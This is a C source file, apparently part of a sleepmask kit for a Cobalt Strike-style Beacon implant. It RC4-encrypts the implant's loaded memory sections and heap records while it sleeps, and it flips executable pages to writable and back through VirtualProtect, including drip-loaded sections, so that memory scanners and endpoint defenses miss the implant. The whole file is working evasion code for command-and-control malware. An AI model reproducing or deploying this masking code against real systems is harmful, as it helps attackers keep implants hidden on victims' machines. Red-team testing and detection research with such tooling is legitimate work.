#include <windows.h>

// Include bof-vs header files
#include "beacon.h"
#include "helpers.h"
#include "sleepmask.h"

// Include sleepmask-vs specific header files
#include "..\debug.h"
#include "..\sleepmask-vs.h"

// ---------------------------------------------------------------------------
// RC4-based beacon masking.
//
// RC4 is a stream cipher. Applying it twice with the same key and a freshly
// initialized state restores the original plaintext, so encrypt == decrypt.
// ---------------------------------------------------------------------------

/**
* Apply the RC4 cipher to the provided buffer in-place.
*
* @param buffer The buffer to encrypt/decrypt.
* @param size   The size of the buffer in bytes.
* @param key    The key to use.
* @param keyLen The size of the key in bytes.
*/
void RC4Data(char* buffer, size_t size, char* key, size_t keyLen) {
    if (buffer == NULL || key == NULL || keyLen == 0) {
        return;
    }

    unsigned char S[256];

    // KSA (Key Scheduling Algorithm)
    for (int i = 0; i < 256; i++) {
        S[i] = (unsigned char)i;
    }
    unsigned char j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + S[i] + (unsigned char)key[i % keyLen];
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }

    // PRGA (Pseudo-Random Generation Algorithm) + XOR with keystream
    unsigned char ii = 0, jj = 0;
    for (size_t n = 0; n < size; n++) {
        ii++;
        jj = jj + S[ii];
        unsigned char tmp = S[ii];
        S[ii] = S[jj];
        S[jj] = tmp;
        buffer[n] ^= S[(unsigned char)(S[ii] + S[jj])];
    }
}

/**
* Mask Beacon
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void MaskBeacon(BEACON_INFO* beaconInfo) {
    RC4Beacon(beaconInfo, TRUE);

    return;
}

/**
* UnMask Beacon
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void UnMaskBeacon(BEACON_INFO* beaconInfo) {
    RC4Beacon(beaconInfo, FALSE);

    return;
}

/**
* RC4 Beacon's Sections/Heap Records
*
* @param beaconInfo A pointer to the BEACON_INFO structure
* @param mask A Boolean value to indicate whether to mask/unmask Beacon
*/
void RC4Beacon(BEACON_INFO* beaconInfo, BOOL mask) {
    // Determine which allocated memory region contains Beacon
    PALLOCATED_MEMORY_REGION beaconMemory = FindRegionByPurpose(&beaconInfo->allocatedMemory, PURPOSE_BEACON_MEMORY);
    if (beaconMemory == NULL) {
        DLOGF("SLEEPMASK: Failed to find Beacon memory. Exiting...\n");
        return;
    }

    // Mask/UnMask the memory
    RC4Sections(beaconMemory, beaconInfo->mask, mask);
    RC4HeapRecords(beaconInfo);

    return;
}

/*
* Check if memory protection is writable
* @param dwProtection The current memory protection constant
* @return A Boolean value to indicate it is writable
*/
BOOL IsWritable(DWORD dwProtection) {
    if (dwProtection == PAGE_EXECUTE_READWRITE
        || dwProtection == PAGE_EXECUTE_WRITECOPY
        || dwProtection == PAGE_READWRITE
        || dwProtection == PAGE_WRITECOPY
        ) {
        return TRUE;
    }
    return FALSE;
}

bool DripProtectSection(LPVOID baseAddress, SIZE_T size, DWORD protect, DWORD pageSize, PDWORD previous) {
    DFR_LOCAL(KERNEL32, VirtualProtect);
    DWORD bytesProtected = 0;

    LPVOID lpCurrent = baseAddress;
    while (bytesProtected < size) {
        DWORD bytesToProtect = (size - bytesProtected < pageSize) ? (size - bytesProtected) : pageSize;
        if (!VirtualProtect(lpCurrent, bytesToProtect, protect, previous)) {
            DLOG("Failed to change protection on drip-loaded page, crash is likely.\n");
            return false;
        }
        bytesProtected += bytesToProtect;
        lpCurrent = (LPVOID)((ULONG_PTR)lpCurrent + bytesToProtect);
    }

    return true;
}

/**
* RC4-encrypt the sections in the provided memory region.
* Handles VirtualProtect transitions for RX regions.
*
* @param allocatedRegion A pointer to a ALLOCATED_MEMORY_REGION structure
* @param maskKey A pointer to the mask key
* @param mask A Boolean value to indicate whether the function is masking/unmasking
*/
void RC4Sections(PALLOCATED_MEMORY_REGION allocatedRegion, char* maskKey, BOOL mask) {
    DFR_LOCAL(KERNEL32, VirtualProtect);
    DWORD oldProtection = 0;

    for (int i = 0; i < sizeof(allocatedRegion->Sections) / sizeof(ALLOCATED_MEMORY_SECTION); i++) {
        // Check we have a valid base address
        char* baseAddress = (char*)allocatedRegion->Sections[i].BaseAddress;
        if (baseAddress == NULL) {
            // Keep searching for a valid section
            continue;
        }

        DLOGF("SLEEPMASK: %s Section (RC4) - Address: %p\n", mask ? "Masking" : "Unmasking", allocatedRegion->Sections[i].BaseAddress);
        if (allocatedRegion->Sections[i].MaskSection == TRUE) {
            // Change protections on any RX regions if masking
            if (allocatedRegion->Sections[i].CurrentProtect == PAGE_EXECUTE_READ && mask == TRUE) {
                oldProtection = 0;
                if (allocatedRegion->Sections[i].DripLoadPageSize) {
                    // Handle drip-loaded sections which are protected in chunks
                    bool success = DripProtectSection(
                        allocatedRegion->Sections[i].BaseAddress,
                        allocatedRegion->Sections[i].VirtualSize,
                        PAGE_READWRITE,
                        allocatedRegion->Sections[i].DripLoadPageSize,
                        &oldProtection
                    );
                    if (!success)
                        continue;
                }
                else {
                    if (!VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, PAGE_READWRITE, &oldProtection)) {
                        DLOG("Failed to change protection from RX to RW turning MaskSection to FALSE, go to next section.\n");
                        allocatedRegion->Sections[i].MaskSection = FALSE;
                        continue;
                    }
                }
                allocatedRegion->Sections[i].CurrentProtect = PAGE_READWRITE;
                allocatedRegion->Sections[i].PreviousProtect = oldProtection;
            }

            // Apply RC4 cipher if section has WRITE permissions
            if (IsWritable(allocatedRegion->Sections[i].CurrentProtect)) {
                RC4Data((char*)baseAddress, allocatedRegion->Sections[i].VirtualSize, maskKey, MASK_SIZE);
            }

            // Restore original protections when unmasking
            if (allocatedRegion->Sections[i].PreviousProtect != allocatedRegion->Sections[i].CurrentProtect && mask == FALSE) {
                oldProtection = 0;
                if (allocatedRegion->Sections[i].DripLoadPageSize) {
                    // Handle drip-loaded sections which are protected in chunks
                    bool success = DripProtectSection(
                        allocatedRegion->Sections[i].BaseAddress,
                        allocatedRegion->Sections[i].VirtualSize,
                        allocatedRegion->Sections[i].PreviousProtect,
                        allocatedRegion->Sections[i].DripLoadPageSize,
                        &oldProtection
                    );
                    if (!success)
                        continue;
                }
                else {
                    if (!VirtualProtect(baseAddress, allocatedRegion->Sections[i].VirtualSize, allocatedRegion->Sections[i].PreviousProtect, &oldProtection)) {
                        DLOG("Failed to restore original protection on virtual memory, crash is likely.\n");
                        continue;
                    }
                }
                allocatedRegion->Sections[i].CurrentProtect = allocatedRegion->Sections[i].PreviousProtect;
                allocatedRegion->Sections[i].PreviousProtect = oldProtection;
            }
        }
    }

    return;
}

/**
* RC4-encrypt Heap Records
*
* @param beaconInfo A pointer to the BEACON_INFO structure
*/
void RC4HeapRecords(BEACON_INFO* beaconInfo) {
    DWORD heapRecord = 0;
    while (beaconInfo->heap_records[heapRecord].ptr != NULL) {
        RC4Data(beaconInfo->heap_records[heapRecord].ptr, beaconInfo->heap_records[heapRecord].size, beaconInfo->mask, MASK_SIZE);
        heapRecord++;
    }

    return;
}

